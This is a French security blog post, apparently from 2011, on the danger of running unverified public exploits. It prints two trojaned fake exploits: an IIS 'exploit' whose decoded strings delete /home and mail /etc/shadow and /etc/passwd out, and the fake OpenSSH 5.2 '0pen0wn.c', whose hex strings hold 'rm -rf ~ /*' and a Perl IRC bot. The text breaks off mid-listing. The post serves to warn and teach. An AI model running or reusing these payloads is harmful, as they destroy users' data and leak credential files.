<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>De l&#39;importance de vérifier les exploits</title>
  <meta name="description" content="Bonjour,">

  <link rel="stylesheet" href="//assets/css/main.css">
  <link rel="canonical" href="//2011/07/23/de-limportance-de-verifier-les-exploits.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="//feed.xml">

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-9302170278788846",
          enable_page_level_ads: true
     });
</script>


  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-16686496-2');
</script>

</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="//">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="//about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="//blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">De l'importance de vérifier les exploits</h1>
    <p class="post-meta"><time datetime="2011-07-23T16:20:00+02:00" itemprop="datePublished">Jul 23, 2011</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>Bonjour,</p>

<p>Aujourd’hui nous allons voir l’importance de ne pas lancer des exploits publics publiés sur exploit-db, full disclosure ou autre sans analyser la payload qui va avec.</p>

<p>Nombre de personnes (souvent des script kiddies), utilisent des exploits sans faire d’effort de relecture du code. En utilisant ces exploits, ils se font souvent poutré sans même le savoir :).</p>

<p>Le but de cet article va donc de vous montrer les dangers liés à l’exécution d’exploit sans vérification préalable. Ca permet aussi de répondre à la question: “l’ASM et la programmation ça sert à quoi pour un pentester/professionnel de la sécurité?”.</p>

<h1 id="iis-6-remote-buffer-overflow-exploit">IIS 6 Remote Buffer Overflow Exploit</h1>

<p>Il y a d’autres perles du même genre comme un “exploit” sur IIS “releasé” y’a quelques années: <a href="http://seclists.org/fulldisclosure/2005/Apr/445">IIS 6 Remote Buffer Overflow Exploit</a>.</p>

<p>Le sploit ressemble à ça:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="code"><pre> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
 <span class="s">"</span><span class="se">\x2f\x62\x69\x6e\x2f\x72\x6d\x20</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x2d\x72\x66\x20\x2f\x68\x6f\x6d</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x65\x2f\x2a\x3b\x63\x6c\x65\x61</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x72\x3b\x65\x63\x68\x6f\x20\x62</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x6c\x34\x63\x6b\x68\x34\x74\x2c</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x68\x65\x68\x65</span><span class="s">"</span><span class="p">;</span>
 
 <span class="kt">char</span> <span class="n">launcher</span> <span class="p">[]</span> <span class="o">=</span>
 <span class="s">"</span><span class="se">\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x73</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x68\x61\x64\x6f\x77\x20\x7c\x6d\x61\x69</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x6c\x20\x66\x75\x6c\x6c\x2d\x64\x69</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x73\x63\x6c\x6f\x73\x75\x72\x65\x40</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x6c\x69\x73\x74\x73\x2e\x67\x72\x6f\x6b</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x2e\x6f\x72\x67\x2e\x75\x6b\x20</span><span class="s">"</span><span class="p">;</span>
 
 <span class="kt">char</span> <span class="n">netcat_shell</span> <span class="p">[]</span> <span class="o">=</span>
 <span class="s">"</span><span class="se">\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x61\x73\x73\x77\x64\x20\x7c\x6d\x61\x69</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x6c\x20\x66\x75\x6c\x6c\x2d\x64\x69</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x73\x63\x6c\x6f\x73\x75\x72\x65\x40</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x6c\x69\x73\x74\x73\x2e\x67\x72\x6f\x6b</span><span class="s">"</span>
 <span class="s">"</span><span class="se">\x2e\x6f\x72\x67\x2e\x75\x6b\x20</span><span class="s">"</span><span class="p">;</span>
 
 
 <span class="n">main</span><span class="p">()</span>
 <span class="p">{</span>
 
 <span class="c1">//Section Initialises designs implemented by mexicans</span>
 <span class="c1">//Imigrate</span>
 <span class="n">system</span><span class="p">(</span><span class="n">launcher</span><span class="p">);</span>
 <span class="n">system</span><span class="p">(</span><span class="n">netcat_shell</span><span class="p">);</span>
 <span class="n">system</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
 
 <span class="c1">//int socket = 0;</span>
 <span class="c1">//double long port = 0.0;</span>
 
 <span class="c1">//#DEFINE port host address</span>
 <span class="c1">//#DEFINE number of inters</span>
 <span class="c1">//#DEFINE gull eeuEE</span>
 
  <span class="c1">//     for(int j; j &lt; 30; j++)</span>
         <span class="p">{</span>
         <span class="c1">//Find socket remote address fault</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">"."</span><span class="p">);</span>
         <span class="p">}</span>
 <span class="c1">//overtake inetinfo here IIS_666666^</span>
 <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Trop fort! Le gars balance 3 system() et il veut nous faire croire que ça exploit un overflow?
(Et surtout vu la taille des “shellcodes” … trop petit pour faire quoique ce soit d’intéressant sous Windows).</p>

<p>En se penchant rapidement sur la chose:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="s">"/bin/rm -rf /home/*;clear;echo bl4ckh4t,hehe"</span>
<span class="n">launcher</span> <span class="o">=</span> <span class="s">"cat /etc/shadow |mail full-disclosure@lists.grok.org.uk"</span>
<span class="n">netcat_shell</span> <span class="o">=</span> <span class="s">"cat /etc/passwd |mail full-disclosure@lists.grok.org.uk"</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Magnifique non? Vous venez de détruire vos données et de leaker des infos (sous conditions que vous soyez loggués avec les privilèges qu’il faut ;)).</p>

<p>Bon c’était pas trop crédible au vu du code …</p>

<p>Un connu et plus crédible.</p>

<h1 id="le-fameux-0day-openssh-52">Le fameux “0day” OpenSSH 5.2</h1>

<p>Un beau jour durant lequel je fais mon habituel checking des news … je tombe sur une news énormissime: il y aurait un 0day SSH en circulation Oo.</p>

<p>C’était après la NDH2009 (donc à mes débuts plus ou moins ;)).
Quelques jour après, on a droit à ce code qui est posté sur plusieurs mailings lists:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
</pre></td><td class="code"><pre><span class="cm">/* 0pen0wn.c by anti-sec group
 * ---------------------------
 * OpenSSH &lt;= 5.2 REMOTE (r00t) EXPLOIT.
 *
 *
 * Takes advantage of an off-by-one
 * bug in mapped authentication space on system
 */</span>

<span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
</span>
<span class="cp">#define VALID_RANGE 0xb44ffe00
#define build_frem(x,y,a,b,c) a##c##a##x##y##b
</span>
<span class="kt">char</span> <span class="n">jmpcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26</span><span class="s">"</span><span class="p">;</span>

<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x0a\x24\x6b\x65</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x64\x20\x2b\x78\x20\x2f\x74\x6d\x70\x2f\x68\x69\x20\x32\x3e\x2f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x3b\x2f\x74\x6d\x70\x2f\x68\x69</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span><span class="p">;</span>

<span class="kt">char</span> <span class="n">fbsd_shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x0a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x24\x63\x68\x61\x6e\x3d\x22\x23\x63\x6e\x22\x3b\x24\x6b\x65\x79</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x3d\x22\x66\x61\x67\x73\x22\x3b\x24\x6e\x69\x63\x6b\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x70\x68\x70\x66\x72\x22\x3b\x24\x73\x65\x72\x76\x65\x72\x3d\x22</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x69\x72\x63\x2e\x68\x61\x6d\x2e\x64\x65\x2e\x65\x75\x69\x72\x63</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2e\x6e\x65\x74\x22\x3b\x24\x53\x49\x47\x7b\x54\x45\x52\x4d\x7d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x64\x20\x2b\x78\x20\x2f\x74\x6d\x70\x2f\x68\x69\x20\x32\x3e\x2f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x3b\x2f\x74\x6d\x70\x2f\x68\x69</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x65\x79\x5c\x6e\x22\x3b\x77\x68\x69\x6c\x65\x20\x28\x3c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6f\x63\x6b\x3e\x29\x7b\x69\x66\x20\x28\x2f\x5e\x50\x49\x4e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x20\x28\x2e\x2a\x29\x24\x2f\x29\x7b\x70\x72\x69\x6e\x74\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x22\x3b\x0a\x77\x68\x69\x6c\x65\x20\x28\x3c\x24\x73\x6f\x63\x6b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6e\x22\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x73\x6c\x65\x65\x70\x20\x31\x3b\x0a\x20\x20\x20\x20\x20\x20\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6b\x5c\x6e\x22\x3b\x7d\x7d\x70\x72\x69\x6e\x74\x20\x24\x73\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x63\x6b\x20\x22\x4a\x4f\x49\x4e\x20\x24\x63\x68\x61\x6e\x20\x24</span><span class="s">"</span>
